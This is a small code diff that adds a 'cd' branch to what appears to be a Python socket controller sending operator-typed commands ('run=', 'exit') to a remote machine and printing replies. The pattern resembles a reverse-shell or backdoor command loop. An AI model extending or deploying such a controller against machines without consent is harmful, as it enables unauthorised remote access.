@@ -37,7 +37,9 @@ while True:
     if inp == "exit":
         conn.send(b"exit")
         conn.close()
-     
+    elif inp.startswith("cd"):
+        conn.send(inp.encode())
+            
     elif inp.startswith("run="):
         conn.send(inp.encode())
         print((conn.recv(1024)).decode())
